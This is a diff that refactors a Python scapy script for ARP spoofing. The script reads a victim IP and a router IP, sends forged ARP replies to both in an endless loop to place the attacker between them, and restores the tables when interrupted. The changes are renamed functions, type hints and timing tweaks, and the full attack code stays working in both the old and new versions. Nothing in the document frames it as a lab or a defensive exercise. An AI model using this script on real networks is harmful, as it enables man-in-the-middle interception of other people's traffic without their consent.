@@ -1,42 +1,67 @@
-from scapy.all import *
+from scapy.all import send, ARP, getmacbyip
 import sys
 import time
 
-def arp_spoof(dest_ip, dest_mac, source_ip):
-    packet = ARP(
-        op='is-at',
-        pdst=dest_ip,
-        hwdst=dest_mac,
-        psrc=source_ip)
-    send(packet, verbose=False)
 
-def arp_restore(dest_ip, dest_mac, source_ip, source_mac):
-    packet = ARP(
-        op='is-at',
-        hwsrc=source_mac,
-        psrc=source_ip,
-        hwdst=dest_mac,
-        pdst=dest_ip)
-    send(packet, verbose=False)
+def spoof_arp(
+    destination_ip: str,
+    destination_mac: str,
+    source_ip: str
+) -> None:
+    send(
+        ARP(
+            op='is-at',
+            pdst=destination_ip,
+            hwdst=destination_mac,
+            psrc=source_ip
+        ),
+        verbose=False
+    )
 
-def spoof():
-    victim_ip = sys.argv[1]
-    router_ip = sys.argv[2]
-    victim_mac = getmacbyip(victim_ip)
-    router_mac = getmacbyip(router_ip)
+
+def restore_arp(
+    destination_ip: str,
+    destination_mac: str,
+    source_ip: str,
+    source_mac: str
+) -> None:
+    send(
+        ARP(
+            op='is-at',
+            hwsrc=source_mac,
+            psrc=source_ip,
+            hwdst=destination_mac,
+            pdst=destination_ip
+        ),
+        verbose=False
+    )
+
+
+def spoof() -> None:
+    victim_ip: str = sys.argv[1]
+    router_ip: str = sys.argv[2]
+
+    victim_mac: str = getmacbyip(victim_ip)
+    router_mac: str = getmacbyip(router_ip)
 
     try:
         while True:
             print('Sending spoofed ARP packets')
-            arp_spoof(victim_ip, victim_mac, router_ip)
-            arp_spoof(router_ip, router_mac, victim_ip)
-            time.sleep(3)
+
+            spoof_arp(victim_ip, victim_mac, router_ip)
+            spoof_arp(router_ip, router_mac, victim_ip)
+
+            time.sleep(2)
     except KeyboardInterrupt:
-        for i in range(5):
-            print('Restoring ARP Tables')
-            arp_restore(router_ip, router_mac, victim_ip, victim_mac)
-            arp_restore(victim_ip, victim_mac, router_ip, router_mac)
-            time.sleep(3)
+        print('\nRestoring ARP Tables...')
+
+        for i in range(4):
+            restore_arp(router_ip, router_mac, victim_ip, victim_mac)
+            restore_arp(victim_ip, victim_mac, router_ip, router_mac)
+
+            time.sleep(2)
+
         quit()
+
 
 spoof()
